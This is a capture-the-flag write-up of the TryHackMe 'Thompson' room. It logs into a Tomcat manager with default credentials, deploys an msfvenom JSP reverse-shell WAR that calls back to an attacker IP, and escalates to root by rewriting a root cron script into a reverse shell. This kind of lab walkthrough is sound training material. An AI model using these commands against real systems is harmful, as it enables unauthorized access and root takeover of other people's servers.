---
layout: post
title: PenLog - "Thompson" by TryHackMe
categories: [TryHackMe, Penlog, Write Up, CTF, OSCP]
---

## Details

**Platform:** [TryHackMe](https://www.tryhackme.com/)\
**Difficulty:** Easy\
**Link:** [Thompson](https://tryhackme.com/room/bsidesgtthompson)

## Enumeration

Run both normal service scan and full port scan on the target using `nmap`:

```bash
$ nmap -vv -Pn -sT -sV -sC -r -n 10.10.58.198
```

This results in:

![nmap1](/images/posts/penlog_thompson_by_tryhackme/nmap1.png)

Open browser and navigate to target's open http port 8080; confirm Tomcat version is v8.5.5 as per the `nmap` scan result:

![tomcat](/images/posts/penlog_thompson_by_tryhackme/tomcat.png)

Navigate to "/manager" by clicking the "Manager App" button; click "Cancel" when prompted for a username and password.

Note the rendered error response mentions example credentials _tomcat:s3cret_:

![tomcat-error](/images/posts/penlog_thompson_by_tryhackme/tomcat_error.png)

Reattempt to authenticate to "/manager" with the example credentials - **success**.

## User Shell

Generate a JSP payload in _.war_ format using `msfvenom`:

```bash
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.4.9.232 LPORT=4444 -f war > shell.war
```
_(**NOTE:** You can list available payloads with `msfvenom --list payloads`; I use `grep` to filter the payloads on a needs basis.)_

Deploy the generated "shell.war":

![tomcat-deploy](/images/posts/penlog_thompson_by_tryhackme/tomcat_deploy.png)

![tomcat-deployed](/images/posts/penlog_thompson_by_tryhackme/tomcat_deployed.png)

Start an `nc` lister on the port specified as _LPORT_ to the `msfvenom` command:

```bash
$ nc -vnlp 4444
```

Click the "/shell" link in the deployed applications list (as shown above)--the Tomcat server will execute the deployed JSP reverse shell code generated using `msfvenom`--to establish a low-privilege _user_ shell.

Upgrade the shell with a PTY:

```bash
$ python -c 'import pty; pty.spawn("/bin/bash")'
$ (Ctrl-Z)
$ stty raw -echo
$ fg
$ export TERM=xterm && reset
```

Get the user "flag.txt":

![nmap1](/images/posts/penlog_thompson_by_tryhackme/user_flag.png)

Notice the "id.sh" file in the user home directory "/home/jack"; this script is owned by _jack_ but is world writable - that is, the _tomcat_ user can change the script:

![id-script-perms](/images/posts/penlog_thompson_by_tryhackme/id_script_perms.png)

This script, when executed, writes out the _uid_ of the executing user to the file "test.txt" in the same home directory:

![id-script-out](/images/posts/penlog_thompson_by_tryhackme/id_script_out.png)

Notice the current "test.txt" reads "root" indicating the last user to execute the "id.sh" script was _root_.

The system "/etc/crontab" shows evidence of the "id.sh" script running every minute as user _root_:

![crontab](/images/posts/penlog_thompson_by_tryhackme/crontab.png)

## Root Shell

Replace the "id.sh" script with a bash reverse shell connection to attacking machine:

![id-script-new](/images/posts/penlog_thompson_by_tryhackme/id_script_new.png)

Start `nc` listener on the attacking machine, specifying expected reverse shell port (4446 in this case):

```bash
$ nc -vnlp 4446
```

Wait for `cron` to execute "id.sh" as root, establishing a reverse shell as _root_; get the root "flag.txt":

![root-shell](/images/posts/penlog_thompson_by_tryhackme/root_shell.png)